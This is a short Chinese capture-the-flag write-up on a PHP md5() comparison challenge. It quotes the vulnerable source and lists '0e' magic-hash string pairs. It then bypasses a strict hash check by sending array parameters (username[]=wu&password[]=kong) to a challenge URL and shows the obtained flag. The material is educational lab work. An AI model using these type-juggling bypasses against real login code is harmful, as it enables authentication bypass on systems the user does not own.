# md5()函数



> ## md5()函数
>
> ### 50
>
> 
>
> <http://123.206.87.240:9009/18.php>
>
> <?php
> error_reporting(0);
> $flag = 'flag{test}';
> if (isset($_GET['username']) and isset($_GET['password'])) {
> if ($_GET['username'] == $_GET['password'])
> print 'Your password can not be your username.';
> else if (md5($_GET['username']) === md5($_GET['password']))
> die('Flag: '.$flag);
> else
> print 'Invalid password';
> }
> ?>



## 1.md5 0e类型缺陷

列举一下0ed+类型字符串

> var_dump(md5('240610708') == md5('QNKCDZO'));
> var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
> var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
> var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
> var_dump('0010e2' == '1e3');
> var_dump('0x1234Ab' == '1193131');
> var_dump('0xABCdef' == ' 0xABCdef');

中间没仔细看 发现是 ===

搜了一下 

> $a === $b	全等	TRUE，如果 $a 等于 $b，并且它们的类型也相同。

所以简单的0e缺陷行不通，

## 2.php特性漏洞（不能处理数组）

于是利用php特性不能处理数组

构造 `username[]=wu&password[]=kong`

即 `http://123.206.87.240:9009/18.php?username[]=wu&password[]=kong`

得到 `Flag: flag{bugk1u-ad8-3dsa-2}`

参考 [php-MD5漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)